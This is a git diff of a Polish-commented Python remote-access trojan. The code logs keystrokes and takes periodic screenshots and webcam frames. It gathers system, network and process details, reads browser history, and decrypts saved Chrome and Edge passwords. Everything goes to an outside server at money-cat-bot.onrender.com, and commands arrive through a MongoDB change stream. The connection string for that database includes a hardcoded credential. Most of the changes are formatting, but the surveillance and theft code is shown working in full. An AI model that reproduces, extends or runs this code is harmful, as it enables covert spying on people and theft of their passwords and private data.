@@ -26,13 +26,17 @@ from pynput.keyboard import Controller
 # 🎯 KONFIGURACJA
 API_URL = "https://money-cat-bot.onrender.com"  # Zmienna do wskazania lokalizacji serwera Express
 COMPUTER_NAME = socket.gethostname()
+
 CAMERA_INDEX = 0  # Jeśli masz kilka kamerek, możesz zmienić
 DELAY = 60  # Czas między wysyłaniem
+
 ACTIVITY_ROLE_ID=1345172216731664424
 
 keys_pressed = []
 lock = asyncio.Lock()
+
 pyautogui.FAILSAFE = False
+
 cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
 
 client = MongoClient("mongodb+srv://money:WRyAg58QYq5L1S43@moneybot.0zo57.mongodb.net/?retryWrites=true&w=majority&appName=MoneyBot")  # Zmienna URL powinna być poprawna
@@ -46,6 +50,7 @@ def watch_changes():
         data = change.get("fullDocument", {})
         name = data.get("COMPUTER_NAME")
         type = data.get("type")
+
         if name == COMPUTER_NAME.upper():
             print("Received request type:", type)
             match type and type.strip().lower():
@@ -186,16 +191,20 @@ def open_app():
 
 def send_to_express(message, computer_name=None, code_block=False, isEmbed=False, Title=None, Color=False):
     payload = {
-        "message": f"```{message}```" if code_block else message,
+        "message": message,
         "COMPUTER_NAME": computer_name,
         "isEmbed": isEmbed,
         "Title": Title,
         "Color": Color,
     }
+
+    if (code_block):
+        payload["message"] = f"```{message}```"
+
     try:
-        requests.post(f"{API_URL}/send", json=payload, timeout=10)
+        requests.post(f"{API_URL}/send", json=payload)
     except requests.exceptions.RequestException as e:
-        print(f"⚠️ Unexpected request error: {e}")
+        print(e)
 
 def on_press(key):
     try:
@@ -208,41 +217,46 @@ listener.start()
 
 async def send_screenshot():
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
-    local_path = os.path.join(documents_path, "local")  # Path to "local" folder
-    os.makedirs(local_path, exist_ok=True)  # Create folder if it doesn't exist
-    while True:
-        try:
-            await asyncio.sleep(DELAY)
-            screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
-            pyautogui.screenshot().save(screenshot_path)
-            with open(screenshot_path, 'rb') as f:
-                files = {'screenshot': f}
-                response = requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_NAME": COMPUTER_NAME}, timeout=10)
-                if response.status_code != 200:
-                    print(f"❌ Error while sending: {response.status_code} - {response.text}")
-            os.remove(screenshot_path)
-        except Exception as e:
-            print(f"❌ Unexpected error: {e}")
+    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
 
-def send_screenshot_now():
-    try:
-        documents_path = os.path.join(os.path.expanduser("~"), "Documents")
-        local_path = os.path.join(documents_path, "local")  # Path to "local" folder
-        os.makedirs(local_path, exist_ok=True)  # Create folder if it doesn't exist
+    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
+
+    while True:
+        await asyncio.sleep(DELAY)
+
         screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
         pyautogui.screenshot().save(screenshot_path)
+
         with open(screenshot_path, 'rb') as f:
             files = {'screenshot': f}
-            data = {
-                "message": f"**{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}**",
-                "COMPUTER_NAME": COMPUTER_NAME
-            }
-            response = requests.post(f"{API_URL}/upload-screenshot", files=files, data=data, timeout=10)
-            if response.status_code != 200:
-                print(f"❌ Error while sending: {response.status_code} - {response.text}")
+            try:
+                requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+            except requests.exceptions.RequestException as e:
+                print(e)
+        
         os.remove(screenshot_path)
-    except Exception as e:
-        print(f"❌ Unexpected error: {e}")
+
+def send_screenshot_now():
+    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
+    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
+
+    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
+
+    screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
+    pyautogui.screenshot().save(screenshot_path)
+
+    with open(screenshot_path, 'rb') as f:
+        files = {'screenshot': f}
+        data = {
+            "message": f"**{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}**",
+            "COMPUTER_NAME": COMPUTER_NAME
+        }
+        
+        try:
+            requests.post(f"{API_URL}/upload-screenshot", files=files, data=data)
+        except requests.exceptions.RequestException as e:
+            print(e)
+    os.remove(screenshot_path)
 
 def send_info_now():
     external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
@@ -250,6 +264,7 @@ def send_info_now():
     user_info = os.getlogin() # Użytkownik systemu
     home_dir = os.path.expanduser("~") # Ścieżka do katalogu domowego
     cwd = os.getcwd() # Ścieżka do katalogu roboczego
+
     data = {
         "COMPUTER_NAME": COMPUTER_NAME,
         "external_ip": external_ip,
@@ -258,6 +273,7 @@ def send_info_now():
         "home_dir": home_dir,
         "cwd": cwd,
     }
+
     try:
         requests.post(f"{API_URL}/info", json=data)
     except requests.exceptions.RequestException as e:
@@ -268,21 +284,25 @@ def send_utils_now():
     memory = psutil.virtual_memory()  # Informacje o pamięci RAM
     disk_usage = psutil.disk_usage('/')  # Informacje o dyskach
     net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)
+
     memory_dict = {
         "total": memory.total,
         "used": memory.used,
         "free": memory.free,
         "percent": memory.percent,
     }
+
     disk_usage_dict = {
         "total": disk_usage.total,
         "used": disk_usage.used,
         "free": disk_usage.free,
         "percent": disk_usage.percent,
     }
+
     net_if_addrs_dict = {}
     for interface, addrs in net_if_addrs.items():
         net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]
+
     data = {
         "COMPUTER_NAME": COMPUTER_NAME,
         "cpu_percent": f"{cpu_percent}%",
@@ -290,6 +310,7 @@ def send_utils_now():
         "disk_usage": disk_usage_dict,
         "net_if_addrs": net_if_addrs_dict,
     }
+
     try:
         requests.post(f"{API_URL}/utils", json=data)
     except requests.exceptions.RequestException as e:
@@ -297,9 +318,11 @@ def send_utils_now():
 
 def send_network_info_now():
     net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)
+
     net_if_addrs_dict = {}
     for interface, addrs in net_if_addrs.items():
         net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]
+
     try:
         requests.post(f"{API_URL}/network_info", json={ "COMPUTER_NAME": COMPUTER_NAME, "net_if_addrs": net_if_addrs_dict })
     except requests.exceptions.RequestException as e:
@@ -307,6 +330,7 @@ def send_network_info_now():
 
 def send_processes_now():
     processes = psutil.process_iter()
+
     processes_list = []
     for process in processes:
         try:
@@ -316,6 +340,7 @@ def send_processes_now():
             })
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             continue
+
     try:
         requests.post(f"{API_URL}/processes", json={ "COMPUTER_NAME": COMPUTER_NAME, "processes": processes_list })
     except requests.exceptions.RequestException as e:
@@ -324,6 +349,7 @@ def send_processes_now():
 async def send_keys():
     while True:
         await asyncio.sleep(DELAY)
+
         async with lock:
             if keys_pressed:
                 send_to_express(''.join(keys_pressed), COMPUTER_NAME, code_block=True, isEmbed=True, Title="Key Logger")
@@ -340,18 +366,24 @@ async def send_camera_frame():
         print("❌ Can not get image from camera!")
         send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
         return
+    
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
     local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
+
     os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
+
     while True:
         await asyncio.sleep(DELAY)
+
         ret, frame = cap.read()
         if not ret:
             print("❌ Error connecting to camera frame!")
             send_to_express("`❌` Error connecting to camera frame!", computer_name=COMPUTER_NAME)
             break
+
         frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
         cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę
+
         with open(frame_path, 'rb') as f:
             files = {'frame': f}
             try:
@@ -362,17 +394,22 @@ async def send_camera_frame():
                     print(f"❌ Failed to upload frame: {response.status_code}")
             except Exception as e:
                 print(f"❌ Error while sending frame: {e}")
+        
         os.remove(frame_path)  # Usuwamy plik po wysłaniu
     cap.release()
 
 def send_camera_frame_now():
+
     if not cap.isOpened():
         print("❌ Can not get image from camera!")
         send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
         return
+    
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
     local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
+
     os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
+    
     ret, frame = cap.read()
     if not ret:
         print("❌ Error connecting to camera frame!")
@@ -381,6 +418,7 @@ def send_camera_frame_now():
 
     frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
     cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę
+
     with open(frame_path, 'rb') as f:
         files = {'frame': f}
         try:
@@ -396,12 +434,16 @@ def send_camera_frame_now():
 
 async def start():
     print("Starting the application...")
+
     open_app()
     run_watch()
+
     external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
     private_ip = socket.gethostbyname(socket.gethostname())
+
     start_bot(external_ip, private_ip)
     print('✅ Application started!')
+
     await asyncio.gather(
         send_screenshot(),
         send_camera_frame(),
@@ -431,11 +473,13 @@ def get_full_app_name(app_name_part):
             full_app_names.append(window)  # Dodajemy pełną nazwę aplikacji do listy
     return full_app_names
 
+# Funkcja do pobierania historii przeglądarek (Edge/Chrome)
 def get_browser_history(browser="chrome", limit=10):
     if browser == "edge":
         history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
     else:  # Domyślnie Chrome
         history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
+        
     history_copy = history_db + "_copy"
     shutil.copy2(history_db, history_copy)
     conn = sqlite3.connect(history_copy)
@@ -444,19 +488,23 @@ def get_browser_history(browser="chrome", limit=10):
     raw_history = cursor.fetchall()
     conn.close()
     os.remove(history_copy)
+    
     history_list = [{"url": url, "title": title, "visits": visits} for url, title, visits in raw_history]
     return history_list
 
+# Funkcja do pobierania klucza szyfrującego dla przeglądarki (Edge/Chrome)
 def get_encryption_key(browser="chrome"):
     if browser == "edge":
         local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
     else:  # Domyślnie Chrome
         local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
+    
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = json.load(f)
     encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Usunięcie "DPAPI"
     return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
+# Funkcja do odszyfrowania hasła
 def decrypt_password(encrypted_password, key):
     try:
         iv = encrypted_password[3:15]
@@ -466,11 +514,13 @@ def decrypt_password(encrypted_password, key):
     except Exception as e:
         return ""
 
+# Funkcja do pobierania zapisanych haseł (Edge/Chrome)
 def get_browser_passwords(browser="chrome"):
     if browser == "edge":
         db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
     else:  # Domyślnie Chrome
         db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
+    
     temp_db = "LoginData.db"
     shutil.copy2(db_path, temp_db)
     conn = sqlite3.connect(temp_db)
